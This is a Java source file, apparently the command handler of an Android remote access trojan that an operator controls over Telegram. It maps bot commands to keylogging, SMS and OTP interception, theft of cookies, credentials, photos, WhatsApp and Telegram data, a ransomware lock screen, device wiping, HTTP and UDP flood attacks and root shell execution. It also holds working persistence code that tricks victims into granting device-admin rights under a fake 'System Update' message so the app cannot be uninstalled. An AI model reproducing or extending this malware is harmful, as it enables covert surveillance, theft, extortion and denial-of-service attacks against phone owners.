package com.enterprise.rat.commands;

import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.os.Environment;
import com.enterprise.rat.admin.AdminReceiver;
import com.enterprise.rat.activities.FakeUpdateActivity;
import com.enterprise.rat.bot.BotConfig;
import com.enterprise.rat.utils.TelegramApi;
import com.google.gson.JsonObject;

public class CommandHandler {
    private Context context;
    private FileManager fileManager;
    private SMSManager smsManager;
    private LocationManager locationManager;
    private CameraManager cameraManager;
    private DeviceInfoManager deviceInfoManager;
    private ContactManager contactManager;
    private CallManager callManager;
    private AudioManager audioManager;
    private ScreenManager screenManager;
    private KeyloggerManager keyloggerManager;
    private ShellManager shellManager;
    private SocialMediaManager socialMediaManager;
    private AppManager appManager;
    private PhishingManager phishingManager;
    private CallRecorderManager callRecorderManager;
    private CookieStealerManager cookieStealerManager;
    private RansomwareManager ransomwareManager;
    private WiFiScannerManager wifiScannerManager;
    private CryptoClipboardManager cryptoClipboardManager;
    private CredentialDumper credentialDumper;
    private AppControllerManager appControllerManager;
    private ProcessManager processManager;
    private SIMInfoManager simInfoManager;
    private USSDManager ussdManager;
    private SMSForwarderManager smsForwarderManager;
    private NotificationReplyManager notificationReplyManager;
    private GeofenceManager geofenceManager;
    private CalendarDumpManager calendarDumpManager;
    private SystemSettingsManager systemSettingsManager;
    private FlashlightManager flashlightManager;
    private WallpaperManager wallpaperManager;
    private TTSSpeakManager ttsSpeakManager;
    private ZipManager zipManager;
    private AppUsageStatsManager usageStatsManager;
    private SearchFileManager searchFileManager;
    private BluetoothScannerManager bluetoothScannerManager;
    private SelfUpdateManager selfUpdateManager;
    private ScreenStreamManager screenStreamManager;
    private AntiDebugDetector antiDebugDetector;
    private GmailExtractorManager gmailExtractorManager;

    public CommandHandler(Context context) {
        this.context = context;
        this.fileManager = new FileManager(context);
        this.smsManager = new SMSManager(context);
        this.locationManager = new LocationManager(context);
        this.cameraManager = new CameraManager(context);
        this.deviceInfoManager = new DeviceInfoManager(context);
        this.contactManager = new ContactManager(context);
        this.callManager = new CallManager(context);
        this.audioManager = new AudioManager(context);
        this.screenManager = new ScreenManager(context);
        this.keyloggerManager = new KeyloggerManager(context);
        this.shellManager = new ShellManager();
        this.socialMediaManager = new SocialMediaManager(context);
        this.appManager = new AppManager(context);
        this.phishingManager = new PhishingManager(context);
        this.callRecorderManager = new CallRecorderManager(context);
        this.cookieStealerManager = new CookieStealerManager(context);
        this.ransomwareManager = new RansomwareManager(context);
        this.wifiScannerManager = new WiFiScannerManager(context);
        this.cryptoClipboardManager = new CryptoClipboardManager(context);
        this.credentialDumper = new CredentialDumper(context);
        this.appControllerManager = new AppControllerManager(context);
        this.processManager = new ProcessManager(context);
        this.simInfoManager = new SIMInfoManager(context);
        this.ussdManager = new USSDManager(context);
        this.smsForwarderManager = new SMSForwarderManager(context);
        this.notificationReplyManager = new NotificationReplyManager(context);
        this.geofenceManager = new GeofenceManager(context);
        this.calendarDumpManager = new CalendarDumpManager(context);
        this.systemSettingsManager = new SystemSettingsManager(context);
        this.flashlightManager = new FlashlightManager(context);
        this.wallpaperManager = new WallpaperManager(context);
        this.ttsSpeakManager = new TTSSpeakManager(context);
        this.zipManager = new ZipManager();
        this.usageStatsManager = new AppUsageStatsManager(context);
        this.searchFileManager = new SearchFileManager();
        this.bluetoothScannerManager = new BluetoothScannerManager(context);
        this.selfUpdateManager = new SelfUpdateManager(context);
        this.screenStreamManager = new ScreenStreamManager(context);
        this.antiDebugDetector = new AntiDebugDetector();
        this.gmailExtractorManager = new GmailExtractorManager();
    }

    public void handleCommand(String text, long chatId, String messageId, JsonObject message) {
        String[] parts = text.trim().split("\\s+");
        if (parts.length == 0) return;
        String cmd = parts[0].toLowerCase();
        if (cmd.equals("/start") || cmd.equals("/help")) { processGlobal(cmd); return; }

        String target = "ALL";
        String[] args = new String[0];
        if (parts.length >= 2) {
            String second = parts[1].toUpperCase();
            if (second.startsWith("SESSION_") || second.equals("ALL")) {
                target = second;
                args = new String[parts.length - 2];
                System.arraycopy(parts, 2, args, 0, args.length);
            } else {
                args = new String[parts.length - 1];
                System.arraycopy(parts, 1, args, 0, args.length);
            }
        }

        String mySession = BotConfig.SESSION_ID.toUpperCase();
        if (!target.equals("ALL") && !target.equals(mySession)) return;

        execute(cmd, args);
    }

    private void processGlobal(String cmd) {
        if (cmd.equals("/start")) {
            TelegramApi.sendMessage("⚡ REX.ENT v5.0\nSession: " + BotConfig.SESSION_ID + "\n/uninstall_block /fake_update /reset_grant");
        } else {
            TelegramApi.sendMessage("Use /command [args]. /start for session ID.");
        }
    }

    private void execute(String cmd, String[] args) {
        try {
            switch (cmd) {
                case "/info": deviceInfoManager.sendDeviceInfo(); break;
                case "/ls":
                    fileManager.listDirectory(args.length > 0 ? args[0] : Environment.getExternalStorageDirectory().getAbsolutePath());
                    break;
                case "/download": if (args.length > 0) fileManager.uploadFile(args[0]); break;
                case "/rm": fileManager.deleteFile(args.length > 0 ? args[0] : ""); break;
                case "/rename": fileManager.renameFile(args.length > 0 ? args[0] : "", args.length > 1 ? args[1] : ""); break;
                case "/sms_list": smsManager.sendSMSList(args.length > 0 ? Integer.parseInt(args[0]) : 10); break;
                case "/sendsms": smsManager.sendSMS(args.length > 0 ? args[0] : "", args.length > 1 ? joinArgs(args, 1) : ""); break;
                case "/delsms": smsManager.deleteSMS(args.length > 0 ? args[0] : ""); break;
                case "/calls": callManager.sendCallLogs(args.length > 0 ? Integer.parseInt(args[0]) : 20); break;
                case "/contacts": contactManager.sendContacts(); break;
                case "/location": locationManager.sendCurrentLocation(); break;
                case "/gps": locationManager.startLiveGPS(); break;
                case "/photo_front": cameraManager.takePhoto(1); break;
                case "/photo_back": cameraManager.takePhoto(0); break;
                case "/record": cameraManager.recordVideo(args.length > 0 ? Integer.parseInt(args[0]) : 10); break;
                case "/mic": audioManager.recordAudio(args.length > 0 ? Integer.parseInt(args[0]) : 10); break;
                case "/liveaudio": audioManager.startLiveStream(); break;
                case "/screenshot": screenManager.takeScreenshot(); break;
                case "/screenrecord": screenManager.startScreenRecord(args.length > 0 ? Integer.parseInt(args[0]) : 10); break;
                case "/keylog_start": keyloggerManager.start(); break;
                case "/keylog_stop": keyloggerManager.stop(); break;
                case "/keylog_dump": keyloggerManager.sendLogs(); break;
                case "/apps": appManager.listInstalledApps(); break;
                case "/battery": deviceInfoManager.sendBatteryStatus(); break;
                case "/network": deviceInfoManager.sendNetworkInfo(); break;
                case "/permissions": deviceInfoManager.sendPermissions(); break;
                case "/clipboard": ClipboardHelper.getClipboard(context); break;
                case "/setclip": ClipboardHelper.setClipboard(context, joinArgs(args, 0)); break;
                case "/notif": NotificationManager.dumpNotifications(); break;
                case "/fakenotif": NotificationManager.sendFake(context, args.length > 0 ? args[0] : "Alert", args.length > 1 ? joinArgs(args, 1) : "Message"); break;
                case "/steal_images": StealerManager.stealImages(context); break;
                case "/steal_docs": StealerManager.stealDocuments(context); break;
                case "/extract_wa": socialMediaManager.extractWhatsApp(); break;
                case "/extract_tg": socialMediaManager.extractTelegram(); break;
                case "/httpflood": NetworkManager.httpFlood(args.length > 0 ? args[0] : "...", args.length > 1 ? Integer.parseInt(args[1]) : 100); break;
                case "/udpflood": NetworkManager.udpFlood(args.length > 0 ? args[0] : "...", args.length > 1 ? Integer.parseInt(args[1]) : 53, args.length > 2 ? Integer.parseInt(args[2]) : 30); break;
                case "/shell": ShellManager.executeCommand(joinArgs(args, 0)); break;
                case "/sush": ShellManager.executeRootCommand(joinArgs(args, 0)); break;
                case "/openurl": phishingManager.openURL(args.length > 0 ? args[0] : ""); break;
                case "/toast": SystemManager.showToast(context, joinArgs(args, 0)); break;
                case "/phish": PhishingManager.showPhishingDialog(context, args.length > 0 ? args[0] : "Google", args.length > 1 ? joinArgs(args, 1) : "Verify"); break;
                case "/vibrate": SystemManager.vibrate(context, args.length > 0 ? Integer.parseInt(args[0]) : 1000); break;
                case "/playsound": SystemManager.playSound(context); break;
                case "/lock": SystemManager.lockDevice(context); break;
                case "/wipe": SystemManager.wipeDevice(context); break;
                case "/destroy": SystemManager.selfDestruct(context); break;
                case "/hideicon": SystemManager.hideIcon(context); break;
                case "/autostart": SystemManager.enableAutostart(context); break;
                case "/socmed": socialMediaManager.auditSocialMedia(); break;
                case "/call_record": callRecorderManager.startCallRecording(args.length > 0 ? Integer.parseInt(args[0]) : 30); break;
                case "/cookies": cookieStealerManager.stealCookies(); break;
                case "/history": cookieStealerManager.stealChromeHistory(); break;
                case "/screen_lock": ransomwareManager.showLockScreen(joinArgs(args, 0)); break;
                case "/screen_unlock": ransomwareManager.removeLockScreen(); break;
                case "/wifi_scan": wifiScannerManager.scanNetworks(); break;
                case "/wifi_pass": wifiScannerManager.retrievePasswords(); break;
                case "/crypto_monitor_start": cryptoClipboardManager.startMonitoring(); break;
                case "/crypto_monitor_stop": cryptoClipboardManager.stopMonitoring(); break;
                case "/cred_harvest_start": credentialDumper.startCredentialHarvest(); break;
                case "/cred_dump": credentialDumper.dumpCredentials(); break;
                case "/launch": appControllerManager.launchApp(args.length > 0 ? args[0] : ""); break;
                case "/uninstall": appControllerManager.uninstallApp(args.length > 0 ? args[0] : ""); break;
                case "/process_list": processManager.listProcesses(); break;
                case "/kill_pid": processManager.killProcess(args.length > 0 ? args[0] : ""); break;
                case "/kill_pkg": processManager.killPackage(args.length > 0 ? args[0] : ""); break;
                case "/sim_info": simInfoManager.getSIMInfo(); break;
                case "/ussd": ussdManager.sendUSSD(args.length > 0 ? args[0] : ""); break;
                case "/sms_fwd": smsForwarderManager.setForward(args.length > 0 ? args[0] : ""); break;
                case "/reply": notificationReplyManager.replyToNotification(args.length > 0 ? args[0] : "", args.length > 1 ? joinArgs(args, 1) : ""); break;
                case "/geofence": geofenceManager.setGeofence(args.length > 0 ? Double.parseDouble(args[0]) : 0, args.length > 1 ? Double.parseDouble(args[1]) : 0, args.length > 2 ? Float.parseFloat(args[2]) : 500); break;
                case "/calendar_dump": calendarDumpManager.dumpCalendar(); break;
                case "/volume": systemSettingsManager.setVolume(args.length > 0 ? Integer.parseInt(args[0]) : 5); break;
                case "/brightness": systemSettingsManager.setBrightness(args.length > 0 ? Integer.parseInt(args[0]) : 100); break;
                case "/ring_mode": systemSettingsManager.setRingMode(args.length > 0 ? args[0] : "normal"); break;
                case "/flashlight": flashlightManager.toggle(args.length > 0 ? Boolean.parseBoolean(args[0]) : true); break;
                case "/wallpaper": wallpaperManager.setFromUrl(args.length > 0 ? args[0] : ""); break;
                case "/speak": ttsSpeakManager.speak(joinArgs(args, 0)); break;
                case "/zip": zipManager.zipFile(args.length > 0 ? args[0] : "", args.length > 1 ? args[1] : null); break;
                case "/usage": usageStatsManager.getStats(); break;
                case "/search": searchFileManager.search(args.length > 0 ? args[0] : null, args.length > 1 ? args[1] : ""); break;
                case "/bluetooth": bluetoothScannerManager.enumerate(); break;
                case "/update": selfUpdateManager.downloadAndInstall(args.length > 0 ? args[0] : ""); break;
                case "/otp_scan": OTPInterceptorManager.interceptOTP(); break;
                case "/cpu_ram": {
                    android.app.ActivityManager am = (android.app.ActivityManager) context.getSystemService(Context.ACTIVITY_SERVICE);
                    android.app.ActivityManager.MemoryInfo mi = new android.app.ActivityManager.MemoryInfo();
                    am.getMemoryInfo(mi);
                    TelegramApi.sendMessage("<b>📊 CPU & RAM</b>\nTotal: <code>" + mi.totalMem/(1024*1024) + "MB</code>\nAvailable: <code>" + mi.availMem/(1024*1024) + "MB</code>");
                    break;
                }
                case "/screen_stream_start": screenStreamManager.startStream(); break;
                case "/screen_stream_stop": screenStreamManager.stopStream(); break;
                case "/check_env": antiDebugDetector.check(context); break;
                case "/gmail": gmailExtractorManager.extract(); break;
                case "/help_full":
                    TelegramApi.sendMessage(getFullHelp());
                    break;

                // ===== NEW COMMANDS =====
                case "/uninstall_block":
                    blockUninstall();
                    break;

                case "/fake_update":
                    showFakeUpdate();
                    break;

                case "/reset_grant":
                    resetPermissions();
                    break;

                default: TelegramApi.sendMessage("Unknown command. Type /help_full"); break;
            }
        } catch (Exception e) {
            TelegramApi.sendMessage("❌ Error: " + e.getMessage());
        }
    }

    private void blockUninstall() {
        try {
            DevicePolicyManager dpm = (DevicePolicyManager) context.getSystemService(Context.DEVICE_POLICY_SERVICE);
            ComponentName adminComponent = new ComponentName(context, AdminReceiver.class);

            if (dpm.isAdminActive(adminComponent)) {
                dpm.setUninstallBlocked(adminComponent, context.getPackageName(), true);
                TelegramApi.sendMessage("✅ Uninstall blocked.");
            } else {
                Intent intent = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
                intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, adminComponent);
                intent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, "System Update requires this.");
                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                context.startActivity(intent);
                TelegramApi.sendMessage("📱 Device admin prompt displayed. After activation, uninstall will be blocked.");
            }
        } catch (Exception e) {
            TelegramApi.sendMessage("❌ " + e.getMessage());
        }
    }

    private void showFakeUpdate() {
        try {
            Intent intent = new Intent(context, FakeUpdateActivity.class);
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            context.startActivity(intent);
            TelegramApi.sendMessage("📱 Fake update screen displayed.");
        } catch (Exception e) {
            TelegramApi.sendMessage("❌ " + e.getMessage());
        }
    }

    private void resetPermissions() {
        try {
            Intent intent = new Intent(context, FakeUpdateActivity.class);
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            context.startActivity(intent);
            TelegramApi.sendMessage("📱 Permission reset prompt displayed.");
        } catch (Exception e) {
            TelegramApi.sendMessage("❌ " + e.getMessage());
        }
    }

    private String getFullHelp() {
        return "<b>📋 ALL COMMANDS</b>\n\n" +
            "<b>📁 File:</b> /ls /download /rm /rename /search /zip\n" +
            "<b>📍 Location:</b> /location /gps /geofence\n" +
            "<b>💬 SMS/Calls:</b> /sms_list /sendsms /delsms /calls /contacts /sms_fwd\n" +
            "<b>📷 Camera:</b> /photo_front /photo_back /record /call_record\n" +
            "<b>🎙 Audio:</b> /mic /liveaudio\n" +
            "<b>🖥 Screen:</b> /screenshot /screenrecord /screen_lock /screen_unlock\n" +
            "<b>⌨ Keylogger:</b> /keylog_start /keylog_stop /keylog_dump\n" +
            "<b>📱 Device:</b> /info /apps /battery /network /permissions /cpu_ram /usage\n" +
            "<b>📋 Clipboard:</b> /clipboard /setclip /crypto_monitor_start\n" +
            "<b>🔔 Notif:</b> /notif /fakenotif /otp_scan /reply\n" +
            "<b>📦 Stealer:</b> /steal_images /steal_docs /extract_wa /extract_tg /cookies\n" +
            "<b>🌐 Network:</b> /httpflood /udpflood /wifi_scan /wifi_pass /bluetooth\n" +
            "<b>⚙ Shell:</b> /shell /sush /process_list /kill_pid /kill_pkg\n" +
            "<b>🛡 System:</b> /openurl /toast /phish /vibrate /playsound /lock /wipe /destroy\n" +
            "<b>🎮 Control:</b> /flashlight /volume /brightness /ring_mode /wallpaper /speak\n" +
            "<b>🔐 Persistence:</b> /uninstall_block /fake_update /reset_grant /hideicon\n";
    }

    private String joinArgs(String[] args, int start) {
        StringBuilder sb = new StringBuilder();
        for (int i = start; i < args.length; i++) {
            if (i > start) sb.append(" ");
            sb.append(args[i]);
        }
        return sb.toString();
    }
}
